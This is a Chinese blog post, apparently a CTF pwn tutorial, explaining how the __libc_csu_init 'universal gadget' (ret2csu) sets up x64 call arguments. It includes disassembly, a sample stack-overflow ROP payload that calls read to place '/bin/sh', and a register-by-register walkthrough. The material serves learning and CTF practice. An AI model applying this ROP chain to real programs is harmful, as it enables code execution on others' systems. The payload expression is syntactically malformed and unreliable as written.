@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>通用gadget详解 - 编程中国的博客</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		<meta property="og:title" content="通用gadget详解" />
+<meta property="og:description" content="gadget 利用gadget是做pwn题时控制程序流程一种重要且常用的方法。
+rop是什么？
+参考链接
+https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/
+我今天主要写我对通用gadget的原理的理解
+通用 gadget 大家要先了解pop ret call等汇编指令,以便更好理解。
+通用gadget之所以叫通用，说明这是可以广泛使用的。
+说明： 程序编译的过程中，会自动加入一些通用函数做初始化的工作，这些初始化函数都是相同的， 所以我们可以考虑在这些函数中找到一些通用的 gadget， 在64位的链接库中就有一个这样的gadget,存在于__libc_csu_init() __libc_csu_init()
+x64 程序的前六个参数依次通过寄存器 rdi、rsi、rdx、rcx、r8、r9 进行传递，我们所找的 gadget 自然也是针对这些寄存器进行操作的。
+函数 __libc_csu_init() 用于对 libc 进行初始化，只要程序调用了 libc，就一定存在这个函数。
+下面是函数 __libc_csu_init()的反汇编
+gdb-peda$ disassemble /r __libc_csu_init Dump of assembler code for function __libc_csu_init: 0x00000000004007d0 &lt;&#43;0&gt;: 41 57 push r15 0x00000000004007d2 &lt;&#43;2&gt;: 41 56 push r14 0x00000000004007d4 &lt;&#43;4&gt;: 49 89 d7 mov r15,rdx 0x00000000004007d7 &lt;&#43;7&gt;: 41 55 push r13 0x00000000004007d9 &lt;&#43;9&gt;: 41 54 push r12 0x00000000004007db &lt;&#43;11&gt;: 4c 8d 25 16 06 20 00 lea r12,[rip&#43;0x200616] # 0x600df8 0x00000000004007e2 &lt;&#43;18&gt;: 55 push rbp 0x00000000004007e3 &lt;&#43;19&gt;: 48 8d 2d 16 06 20 00 lea rbp,[rip&#43;0x200616] # 0x600e00 0x00000000004007ea &lt;&#43;26&gt;: 53 push rbx 0x00000000004007eb &lt;&#43;27&gt;: 41 89 fd mov r13d,edi 0x00000000004007ee &lt;&#43;30&gt;: 49 89 f6 mov r14,rsi 0x00000000004007f1 &lt;&#43;33&gt;: 4c 29 e5 sub rbp,r12 0x00000000004007f4 &lt;&#43;36&gt;: 48 83 ec 08 sub rsp,0x8 0x00000000004007f8 &lt;&#43;40&gt;: 48 c1 fd 03 sar rbp,0x3 0x00000000004007fc &lt;&#43;44&gt;: ff 15 f6 07 20 00 call QWORD PTR [rip&#43;0x2007f6] # 0x600ff8 0x0000000000400802 &lt;&#43;50&gt;: 48 85 ed test rbp,rbp 0x0000000000400805 &lt;&#43;53&gt;: 74 1f je 0x400826 &lt;__libc_csu_init&#43;86&gt; 0x0000000000400807 &lt;&#43;55&gt;: 31 db xor ebx,ebx 0x0000000000400809 &lt;&#43;57&gt;: 0f 1f 80 00 00 00 00 nop DWORD PTR [rax&#43;0x0] 0x0000000000400810 &lt;&#43;64&gt;: 4c 89 fa mov rdx,r15 0x0000000000400813 &lt;&#43;67&gt;: 4c 89 f6 mov rsi,r14 0x0000000000400816 &lt;&#43;70&gt;: 44 89 ef mov edi,r13d 0x0000000000400819 &lt;&#43;73&gt;: 41 ff 14 dc call QWORD PTR [r12&#43;rbx*8] 0x000000000040081d &lt;&#43;77&gt;: 48 83 c3 01 add rbx,0x1 0x0000000000400821 &lt;&#43;81&gt;: 48 39 dd cmp rbp,rbx 0x0000000000400824 &lt;&#43;84&gt;: 75 ea jne 0x400810 &lt;__libc_csu_init&#43;64&gt; 0x0000000000400826 &lt;&#43;86&gt;: 48 83 c4 08 add rsp,0x8 0x000000000040082a &lt;&#43;90&gt;: 5b pop rbx 0x000000000040082b &lt;&#43;91&gt;: 5d pop rbp 0x000000000040082c &lt;&#43;92&gt;: 41 5c pop r12 0x000000000040082e &lt;&#43;94&gt;: 41 5d pop r13 0x0000000000400830 &lt;&#43;96&gt;: 41 5e pop r14 0x0000000000400832 &lt;&#43;98&gt;: 41 5f pop r15 0x0000000000400834 &lt;&#43;100&gt;: c3 ret End of assembler dump." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/52147a77ea2a9a0feb50fab053e1fb87/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2019-12-26T10:52:55+08:00" />
+<meta property="article:modified_time" content="2019-12-26T10:52:55+08:00" />
+
+
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="编程中国的博客" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">编程中国的博客</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">通用gadget详解</h1>
+			
+		</header>
+		<div id="gatop"></div>
+		<div class="content post__content clearfix">
+			
+<div id="content_views" class="markdown_views prism-atom-one-dark">
+                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
+                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
+                    </svg>
+                    <h3><a id="gadget_0"></a>gadget</h3> 
+<p>利用gadget是做pwn题时控制程序流程一种重要且常用的方法。<br> rop是什么？<br> 参考链接<br> <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/" rel="nofollow">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/</a><br> 我今天主要写我对通用gadget的原理的理解</p> 
+<h2><a id="_gadget_8"></a>通用 gadget</h2> 
+<p><strong>大家要先了解pop ret call等汇编指令,以便更好理解。</strong></p> 
+<p>通用gadget之所以叫通用，说明这是可以广泛使用的。</p> 
+<pre><code>说明：
+
+	程序编译的过程中，会自动加入一些通用函数做初始化的工作，这些初始化函数都是相同的，
+	所以我们可以考虑在这些函数中找到一些通用的 gadget，
+	在64位的链接库中就有一个这样的gadget,存在于__libc_csu_init()
+</code></pre> 
+<p>__libc_csu_init()</p> 
+<p>x64 程序的前六个参数依次通过寄存器 rdi、rsi、rdx、rcx、r8、r9 进行传递，我们所找的 gadget 自然也是针对这些寄存器进行操作的。</p> 
+<p>函数 __libc_csu_init() 用于对 libc 进行初始化，只要程序调用了 libc，就一定存在这个函数。</p> 
+<p><strong>下面是函数 __libc_csu_init()的反汇编</strong></p> 
+<pre><code class="prism language-c">gdb<span class="token operator">-</span>peda$ disassemble <span class="token operator">/</span>r __libc_csu_init
+Dump of assembler code <span class="token keyword">for</span> function __libc_csu_init<span class="token punctuation">:</span>
+   <span class="token number">0x00000000004007d0</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">0</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>     <span class="token number">41</span> <span class="token number">57</span>   push   r15
+   <span class="token number">0x00000000004007d2</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">2</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>     <span class="token number">41</span> <span class="token number">56</span>   push   r14
+   <span class="token number">0x00000000004007d4</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>     <span class="token number">49</span> <span class="token number">89</span> d7        mov    r15<span class="token punctuation">,</span>rdx
+   <span class="token number">0x00000000004007d7</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">7</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>     <span class="token number">41</span> <span class="token number">55</span>   push   r13
+   <span class="token number">0x00000000004007d9</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">9</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>     <span class="token number">41</span> <span class="token number">54</span>   push   r12
+   <span class="token number">0x00000000004007db</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">11</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">4</span>c <span class="token number">8</span>d <span class="token number">25</span> <span class="token number">16</span> <span class="token number">06</span> <span class="token number">20</span> <span class="token number">00</span>    lea    r12<span class="token punctuation">,</span><span class="token punctuation">[</span>rip<span class="token operator">+</span><span class="token number">0x200616</span><span class="token punctuation">]</span>        # <span class="token number">0x600df8</span>
+   <span class="token number">0x00000000004007e2</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">18</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">55</span>      push   rbp
+   <span class="token number">0x00000000004007e3</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">19</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">48</span> <span class="token number">8</span>d <span class="token number">2</span>d <span class="token number">16</span> <span class="token number">06</span> <span class="token number">20</span> <span class="token number">00</span>    lea    rbp<span class="token punctuation">,</span><span class="token punctuation">[</span>rip<span class="token operator">+</span><span class="token number">0x200616</span><span class="token punctuation">]</span>        # <span class="token number">0x600e00</span>
+   <span class="token number">0x00000000004007ea</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">26</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">53</span>      push   rbx
+   <span class="token number">0x00000000004007eb</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">27</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">41</span> <span class="token number">89</span> fd        mov    r13d<span class="token punctuation">,</span>edi
+   <span class="token number">0x00000000004007ee</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">30</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">49</span> <span class="token number">89</span> f6        mov    r14<span class="token punctuation">,</span>rsi
+   <span class="token number">0x00000000004007f1</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">33</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">4</span>c <span class="token number">29</span> e5        sub    rbp<span class="token punctuation">,</span>r12
+   <span class="token number">0x00000000004007f4</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">36</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">48</span> <span class="token number">83</span> ec <span class="token number">08</span>     sub    rsp<span class="token punctuation">,</span><span class="token number">0x8</span>
+   <span class="token number">0x00000000004007f8</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">40</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">48</span> c1 fd <span class="token number">03</span>     sar    rbp<span class="token punctuation">,</span><span class="token number">0x3</span>
+   <span class="token number">0x00000000004007fc</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">44</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    ff <span class="token number">15</span> f6 <span class="token number">07</span> <span class="token number">20</span> <span class="token number">00</span>       call   QWORD PTR <span class="token punctuation">[</span>rip<span class="token operator">+</span><span class="token number">0x2007f6</span><span class="token punctuation">]</span>        # <span class="token number">0x600ff8</span>
+   <span class="token number">0x0000000000400802</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">50</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">48</span> <span class="token number">85</span> ed        test   rbp<span class="token punctuation">,</span>rbp
+   <span class="token number">0x0000000000400805</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">53</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">74</span> <span class="token number">1f</span>   je     <span class="token number">0x400826</span> <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">86</span><span class="token operator">&gt;</span>
+   <span class="token number">0x0000000000400807</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">55</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">31</span> db   xor    ebx<span class="token punctuation">,</span>ebx
+   <span class="token number">0x0000000000400809</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">57</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">0f</span> <span class="token number">1f</span> <span class="token number">80</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>    nop    DWORD PTR <span class="token punctuation">[</span>rax<span class="token operator">+</span><span class="token number">0x0</span><span class="token punctuation">]</span>
+   <span class="token number">0x0000000000400810</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">64</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">4</span>c <span class="token number">89</span> fa        mov    rdx<span class="token punctuation">,</span>r15
+   <span class="token number">0x0000000000400813</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">67</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">4</span>c <span class="token number">89</span> f6        mov    rsi<span class="token punctuation">,</span>r14
+   <span class="token number">0x0000000000400816</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">70</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">44</span> <span class="token number">89</span> ef        mov    edi<span class="token punctuation">,</span>r13d
+   <span class="token number">0x0000000000400819</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">73</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">41</span> ff <span class="token number">14</span> dc     call   QWORD PTR <span class="token punctuation">[</span>r12<span class="token operator">+</span>rbx<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">]</span>
+   <span class="token number">0x000000000040081d</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">77</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">48</span> <span class="token number">83</span> c3 <span class="token number">01</span>     add    rbx<span class="token punctuation">,</span><span class="token number">0x1</span>
+   <span class="token number">0x0000000000400821</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">81</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">48</span> <span class="token number">39</span> dd        cmp    rbp<span class="token punctuation">,</span>rbx
+   <span class="token number">0x0000000000400824</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">84</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">75</span> ea   jne    <span class="token number">0x400810</span> <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">64</span><span class="token operator">&gt;</span>
+   <span class="token number">0x0000000000400826</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">86</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">48</span> <span class="token number">83</span> c4 <span class="token number">08</span>     add    rsp<span class="token punctuation">,</span><span class="token number">0x8</span>
+   <span class="token number">0x000000000040082a</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">90</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">5</span>b      pop    rbx
+   <span class="token number">0x000000000040082b</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">91</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">5</span>d      pop    rbp
+   <span class="token number">0x000000000040082c</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">92</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">41</span> <span class="token number">5</span>c   pop    r12
+   <span class="token number">0x000000000040082e</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">94</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">41</span> <span class="token number">5</span>d   pop    r13
+   <span class="token number">0x0000000000400830</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">96</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">41</span> <span class="token number">5</span>e   pop    r14
+   <span class="token number">0x0000000000400832</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">98</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">41</span> <span class="token number">5f</span>   pop    r15
+   <span class="token number">0x0000000000400834</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">100</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>   c3      ret
+End of assembler dump<span class="token punctuation">.</span>
+</code></pre> 
+<p><strong>从中提取出两段（必须以ret结尾），把它们叫做 rop1 和 rop2</strong>：<br> 正是对这两段的巧妙利用得到了通用gadget，要想深刻的理解它，可以自己在下面推导一下。<br> <strong>rop1</strong></p> 
+<pre><code class="prism language-c">   <span class="token number">0x000000000040082a</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">90</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">5</span>b      pop    rbx
+   <span class="token number">0x000000000040082b</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">91</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">5</span>d      pop    rbp
+   <span class="token number">0x000000000040082c</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">92</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">41</span> <span class="token number">5</span>c   pop    r12
+   <span class="token number">0x000000000040082e</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">94</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">41</span> <span class="token number">5</span>d   pop    r13
+   <span class="token number">0x0000000000400830</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">96</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">41</span> <span class="token number">5</span>e   pop    r14
+   <span class="token number">0x0000000000400832</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">98</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">41</span> <span class="token number">5f</span>   pop    r15
+   <span class="token number">0x0000000000400834</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">100</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>   c3      ret
+</code></pre> 
+<p><strong>rop2</strong></p> 
+<pre><code class="prism language-c">  <span class="token number">0x0000000000400810</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">64</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">4</span>c <span class="token number">89</span> fa         mov    rdx<span class="token punctuation">,</span>r15
+   <span class="token number">0x0000000000400813</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">67</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">4</span>c <span class="token number">89</span> f6        mov    rsi<span class="token punctuation">,</span>r14
+   <span class="token number">0x0000000000400816</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">70</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">44</span> <span class="token number">89</span> ef        mov    edi<span class="token punctuation">,</span>r13d
+   <span class="token number">0x0000000000400819</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">73</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">41</span> ff <span class="token number">14</span> dc     call   QWORD PTR <span class="token punctuation">[</span>r12<span class="token operator">+</span>rbx<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">]</span>
+   <span class="token number">0x000000000040081d</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">77</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">48</span> <span class="token number">83</span> c3 <span class="token number">01</span>     add    rbx<span class="token punctuation">,</span><span class="token number">0x1</span>
+   <span class="token number">0x0000000000400821</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">81</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">48</span> <span class="token number">39</span> dd        cmp    rbp<span class="token punctuation">,</span>rbx
+   <span class="token number">0x0000000000400824</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">84</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">75</span> ea   		jne    <span class="token number">0x400810</span> <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">64</span><span class="token operator">&gt;</span>
+   <span class="token number">0x0000000000400826</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">86</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">48</span> <span class="token number">83</span> c4 <span class="token number">08</span>     add    rsp<span class="token punctuation">,</span><span class="token number">0x8</span>
+   <span class="token number">0x000000000040082a</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">90</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">5</span>b      		pop    rbx
+   <span class="token number">0x000000000040082b</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">91</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">5</span>d     			pop    rbp
+   <span class="token number">0x000000000040082c</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">92</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">41</span> <span class="token number">5</span>c  			pop    r12
+   <span class="token number">0x000000000040082e</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">94</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">41</span> <span class="token number">5</span>d  			 pop    r13
+   <span class="token number">0x0000000000400830</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">96</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">41</span> <span class="token number">5</span>e 			pop    r14
+   <span class="token number">0x0000000000400832</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">98</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    <span class="token number">41</span> <span class="token number">5f</span>			pop    r15
+   <span class="token number">0x0000000000400834</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">100</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>   c3     			ret
+</code></pre> 
+<p>我们可以看到<br> <strong>rop1 中连续六个 pop，可以将栈里的六个值传入pop rbx_rbp_r12_r13_r14_r15</strong></p> 
+<pre><code class="prism language-c">rop2中rdi<span class="token punctuation">,</span>rsi<span class="token punctuation">,</span>rdx正好是<span class="token number">64</span>位传参的前三个寄存器
+							rdx <span class="token operator">&lt;</span><span class="token operator">--</span> <span class="token punctuation">(</span>r15<span class="token punctuation">)</span><span class="token punctuation">,</span>
+							rsi <span class="token operator">&lt;</span><span class="token operator">--</span> <span class="token punctuation">(</span>r14<span class="token punctuation">)</span><span class="token punctuation">,</span>
+							edi <span class="token operator">&lt;</span><span class="token operator">--</span> <span class="token punctuation">(</span>r13<span class="token punctuation">)</span>
+		紧接着call   QWORD PTR <span class="token punctuation">[</span>r12<span class="token operator">+</span>rbx<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">]</span> 
+</code></pre> 
+<pre><code>这里我们就能控制call的地址为r12里填入的地址，使rbx=0
+调用完还会回到rop2
+</code></pre> 
+<pre><code>add    rbx,0x1
+cmp    rbp,rbx
+jne    0x400810 &lt;__libc_csu_init+64&gt;
+add    rsp,0x8
+pop    rbx
+pop    rbp
+pop    r12
+pop    r13
+pop    r14
+pop    r15
+ret
+</code></pre> 
+<p>因此我们可以借此rop1和rop2来调用函数并传入参数</p> 
+<p>用我最近做的一个题的payload来说明<br> payload如下：</p> 
+<pre><code class="prism language-c"><span class="token string">"a"</span> <span class="token operator">*</span> <span class="token number">0x48</span> <span class="token operator">+</span> <span class="token function">p64</span><span class="token punctuation">(</span>rop1<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">p64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">p64</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">p64</span><span class="token punctuation">(</span>read_got<span class="token punctuation">)</span>
+ <span class="token operator">+</span> <span class="token function">p64</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">p64</span><span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">p64</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>
+ <span class="token operator">+</span> <span class="token function">p64</span><span class="token punctuation">(</span>rop2<span class="token punctuation">)</span><span class="token operator">+</span> <span class="token operator">*</span> <span class="token number">56</span><span class="token operator">+</span><span class="token function">p64</span><span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span><span class="token operator">+</span>payload<span class="token punctuation">.</span><span class="token function">ljust</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span>
+</code></pre> 
+<p>配图：（将就一下。做完图出了点问题，可以自己参照做一下）<br> <img src="https://images2.imgbox.com/33/80/GFLbYtHE_o.png" alt="在这里插入图片描述"></p> 
+<pre><code>payload讲解首先是栈溢出到函数返回地址，填充为rop1的地址,	
+后面加上六个参数，再加上rop2,
+再填充56个字节，调整栈帧
+最后加上函数start的地址。
+后面填充'a'到200完成payload的输入
+</code></pre> 
+<p><strong>参考上图了解程序流程</strong>，<strong>要先知道汇编命令的含义</strong></p> 
+<p>首先payload输入后</p> 
+<pre><code class="prism language-c">	原本栈帧调用rop1后
+	ret指令会将rsp加<span class="token number">8</span> 则rsp会指向<span class="token function">p64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>		即覆盖的第一个参数
+
+	将函数返回地址传给eip 	<span class="token comment">//CPU通过EIP寄存器读取即将要执行的指令</span>
+
+	eip指向函数返回地址，即rop1的地址，
+	程序开始执行rop1里的汇编代码
+</code></pre> 
+<p>由rop1可知pop指令将参数传给各个寄存器中<br> 每次将栈里数据pop后rsp都会加上8<br> 如下：</p> 
+<pre><code class="prism language-c">rbx <span class="token operator">&lt;</span><span class="token operator">--</span> <span class="token number">0</span>
+rbp <span class="token operator">&lt;</span><span class="token operator">--</span> <span class="token number">1</span>
+r12 <span class="token operator">&lt;</span><span class="token operator">--</span> read_got
+r13 <span class="token operator">&lt;</span><span class="token operator">--</span> <span class="token number">8</span>
+r14 <span class="token operator">&lt;</span><span class="token operator">--</span> binsh_addr
+r15 <span class="token operator">&lt;</span><span class="token operator">--</span> <span class="token number">1</span>
+</code></pre> 
+<p>此时rsp指向了rop2，<br> 同样的，rop1的ret指令将</p> 
+<pre><code class="prism language-c">	eip <span class="token operator">&lt;</span><span class="token operator">--</span> rop2的地址
+	rsp<span class="token operator">+</span><span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">;</span>	指向了填充的<span class="token number">56</span><span class="token operator">*</span><span class="token string">'a'</span>
+</code></pre> 
+<p>开始执行rop2的汇编代码</p> 
+<pre><code class="prism language-c">	rdx <span class="token operator">&lt;</span><span class="token operator">--</span> r15 <span class="token operator">&lt;</span><span class="token operator">--</span> <span class="token number">1</span>
+	rsi <span class="token operator">&lt;</span><span class="token operator">--</span> r14 <span class="token operator">&lt;</span><span class="token operator">--</span> binsh_addr
+	edi <span class="token operator">&lt;</span><span class="token operator">--</span> r13 <span class="token operator">&lt;</span><span class="token operator">--</span> <span class="token number">8</span>
+	将这三个参数传入了前三个寄存器中
+	call   QWORD PTR <span class="token punctuation">[</span>r12<span class="token operator">+</span>rbx<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">]</span>
+	这句汇编就可以调用r12里的函数地址并将 上面寄存器的参数传给此函数
+</code></pre> 
+<p>可以知道payload的调用函数的参数恰好可以通过rop链传入</p> 
+<pre><code class="prism language-c">	接着
+	add    rbx<span class="token punctuation">,</span><span class="token number">0x1</span>  （rbx<span class="token operator">=</span><span class="token number">1</span>）
+	cmp    rbp<span class="token punctuation">,</span>rbx   <span class="token punctuation">(</span>rbp<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>rbx<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
+	jne    <span class="token number">0x400810</span> <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">64</span><span class="token operator">&gt;</span>
+	<span class="token comment">//有下面的指令解释可以知道相等不跳转</span>
+	所以继续执行下面的汇编
+	add    rsp<span class="token punctuation">,</span><span class="token number">0x8</span>
+	pop    rbx
+    pop    rbp
+    pop    r12
+    pop    r13
+    pop    r14
+    pop    r15
+	这几句将rsp<span class="token operator">+</span><span class="token number">7</span><span class="token operator">*</span><span class="token number">8</span>就是加上了<span class="token number">56</span>
+	由payload知道，此时rsp正好跳过了<span class="token number">56</span><span class="token operator">*</span><span class="token string">'a'</span>指向了start函数的地址
+	最后ret指令
+	eip <span class="token operator">&lt;</span><span class="token operator">--</span> start地址
+</code></pre> 
+<p>到这里通用gadget完成了一次调用</p> 
+<p><strong>这个payload的作用就是调用了read函数读取内容到要填写/bin/sh的地址<br> 并重新执行函数start</strong></p> 
